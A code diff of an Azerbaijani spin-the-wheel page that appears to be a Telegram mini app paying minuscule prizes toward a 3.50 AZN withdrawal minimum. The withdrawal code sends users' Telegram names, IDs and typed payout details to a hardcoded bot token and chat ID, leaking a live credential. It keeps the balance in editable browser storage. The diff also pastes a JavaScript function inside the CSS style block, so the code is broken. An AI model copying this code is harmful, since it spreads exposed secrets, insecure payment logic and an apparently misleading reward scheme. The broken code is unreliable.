@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Sadə Konfet Çarxı</title>
   <style>
     body {
@@ -36,18 +36,28 @@
       border-radius: 50%;
       transition: transform 4s ease-out;
     }
-    #arrow {
-      width: 0;
-      height: 0;
-      border-left: 20px solid transparent;
-      border-right: 20px solid transparent;
-      border-bottom: 40px solid red;
-      position: absolute;
-      top: -40px;
-      left: calc(50% - 20px);
-      z-index: 10;
-    }
-    #withdrawPopup {
+    function spinWheel() {
+  const randomAngle = Math.floor(Math.random() * 360);
+  const fullRotations = 5 * 360;
+  const totalRotation = fullRotations + randomAngle;
+
+  wheelCanvas.style.transition = "transform 4s ease-out";
+  wheelCanvas.style.transform = `rotate(${totalRotation}deg)`;
+
+  setTimeout(() => {
+    const finalAngle = (totalRotation % 360); // bucağın qalıq hissəsi
+    const angleUnderArrow = (360 - finalAngle) % 360; // oxun altına düşən real bucaq (0° yuxarı)
+    const index = Math.floor(angleUnderArrow / angleStep) % prizes.length;
+    const reward = prizes[index];
+
+    balance += reward;
+    spinCount++;
+    localStorage.setItem('balance', balance);
+    localStorage.setItem('spinCount', spinCount);
+    updateSpinText();
+    alert(`${reward.toFixed(6)} AZN qazandınız!`);
+  }, 4000);
+  }  #withdrawPopup {
       position: fixed;
       top: 50%; left: 50%;
       transform: translate(-50%, -50%);
@@ -75,9 +85,8 @@
   <button class="btn" onclick="showAdAndSpin()">Çarxı Fırlat</button>
   <button class="btn" onclick="showWithdraw()">Çıxarış</button>
   <button class="btn" onclick="showBalance()">Balans</button>
-
   <div id="withdrawPopup">
-    <p>Çıxarış üçün yöntəm yazıb <strong>GÖNDƏR</strong> düyməsinə basın. Yoxlanıldıqdan sonra təsdiqlənəcəkdir.</p>
+    <p>Çıxarış üçün yöntəm yazıb göndərin, yoxlanıldıqdan sonra təsdiqlənəcəkdir.</p>
     <input type="text" id="withdrawMethod" placeholder="Çıxarış yöntəmini yazın" />
     <br>
     <button class="btn" onclick="submitWithdraw()">GÖNDƏR</button>
@@ -88,9 +97,15 @@
   <script>
     const wheelCanvas = document.getElementById("wheel");
     const ctx = wheelCanvas.getContext("2d");
-    const prizes = [0.1, 0.0008, 0.0005, 0.03, 0.00000001, 0.04, 0.2];
-    const colors = ["#f9c", "#fc9", "#9cf", "#cfc", "#ccf", "#ffc", "#f99"];
-    const angleStep = (2 * Math.PI) / prizes.length;
+    const prizes = [
+      0.0008, 0.001, 0.05, 0.09, 0.00002, 0.000009, 0.00006, 0.0003, 0.002, 0.1
+    ];
+    const labels = [
+      "0.0008 qəpik", "0.001 qəpik", "0.05 qəpik", "0.09 qəpik", "0.00002 qəpik",
+      "0.000009 qəpik", "0.00006 qəpik", "0.0003 qəpik", "0.002 qəpik", "0.1 qəpik"
+    ];
+    const colors = ["#f9c", "#fc9", "#9cf", "#cfc", "#ccf", "#ffc", "#f99", "#cff", "#fcc", "#cc9"];
+    const angleStep = 360 / prizes.length;
 
     let spinCount = parseInt(localStorage.getItem('spinCount') || '0');
     let lastReset = parseInt(localStorage.getItem('lastReset') || '0');
@@ -102,19 +117,21 @@
         ctx.beginPath();
         ctx.moveTo(150, 150);
         ctx.fillStyle = colors[i % colors.length];
-        ctx.arc(150, 150, 150, i * angleStep, (i + 1) * angleStep);
+        ctx.arc(150, 150, 150, i * 2 * Math.PI / prizes.length, (i + 1) * 2 * Math.PI / prizes.length);
         ctx.fill();
         ctx.save();
         ctx.translate(150, 150);
-        ctx.rotate(i * angleStep + angleStep / 2);
+        ctx.rotate(i * 2 * Math.PI / prizes.length + Math.PI / prizes.length);
         ctx.textAlign = "right";
         ctx.fillStyle = "#000";
         ctx.font = "bold 14px Arial";
-        ctx.fillText(`${prizes[i]} AZN`, 140, 5);
+        ctx.fillText(labels[i], 140, 5);
         ctx.restore();
       }
     }
+
     drawWheel();
+    updateSpinText();
 
     function updateSpinText() {
       document.getElementById("spinCounter").innerText = `${spinCount}/50`;
@@ -143,11 +160,16 @@
     }
 
     function spinWheel() {
-      const index = Math.floor(Math.random() * prizes.length);
-      const angle = 360 * 5 + (360 / prizes.length) * index;
+      const randomAngle = Math.floor(Math.random() * 360);
+      const fullRotations = 5 * 360;
+      const totalRotation = fullRotations + randomAngle;
+
       wheelCanvas.style.transition = "transform 4s ease-out";
-      wheelCanvas.style.transform = `rotate(${angle}deg)`;
+      wheelCanvas.style.transform = `rotate(${totalRotation}deg)`;
+
       setTimeout(() => {
+        const finalAngle = (360 - (totalRotation % 360)) % 360; // Üst hissə = 0°
+        const index = Math.floor(finalAngle / angleStep) % prizes.length;
         const reward = prizes[index];
         balance += reward;
         spinCount++;
@@ -159,42 +181,28 @@
     }
 
     function showWithdraw() {
-  if (balance < 3) {
-    alert("Minimum çıxarış məbləği 3 AZN-dir.");
-    return;
-  }
-  document.getElementById("withdrawPopup").style.display = "block";
+      if (balance < 3.5) return alert("Minimum çıxarış məbləği 3.50 AZN-dir.");
+      document.getElementById("withdrawPopup").style.display = "block";
     }
+
     function submitWithdraw() {
       const method = document.getElementById("withdrawMethod").value;
       if (!method) return alert("Zəhmət olmasa çıxarış yöntəmini daxil edin.");
-
-      const tg = window.Telegram?.WebApp?.initDataUnsafe?.user || {};
-      const name = encodeURIComponent(tg.first_name || 'Naməlum');
-      const id = encodeURIComponent(tg.id || 'Naməlum');
-      const text = encodeURIComponent(method);
-      const amount = balance.toFixed(2);
-
-      const message = `✉️ Çıxarış sorğusu:%0AAd: ${name}%0AID: ${id}%0AYöntəm: ${text}%0AMəbləğ: ${amount} AZN`;
-
-      fetch(`https://api.telegram.org/bot8133472449:AAHtl4g78JW2Jx5uw3Pxgn5TCXdVQTO9lMI/sendMessage?chat_id=8197921729&text=${message}`)
+      const tg = window.Telegram.WebApp.initDataUnsafe?.user;
+      const msg = `✉️ Çıxarış sorğusu:%0AAd: ${tg?.first_name || 'Naməlum'}%0AID: ${tg?.id || 'Naməlum'}%0AYöntəm: ${method}%0AMəbləğ: ${balance.toFixed(2)} AZN`;
+      fetch(`https://api.telegram.org/bot8133472449:AAHtl4g78JW2Jx5uw3Pxgn5TCXdVQTO9lMI/sendMessage?chat_id=8197921729&text=${msg}`)
         .then(res => res.json())
         .then(() => {
           alert("Çıxarış göndərildi!");
           balance = 0;
           localStorage.setItem('balance', '0');
           document.getElementById("withdrawPopup").style.display = "none";
-        })
-        .catch(() => {
-          alert("Mesaj göndərilə bilmədi. Zəhmət olmasa bir daha yoxlayın.");
         });
     }
 
     function showBalance() {
       alert(`Balans: ${balance.toFixed(5)} AZN`);
     }
-
-    updateSpinText();
   </script>
 </body>
 </html>
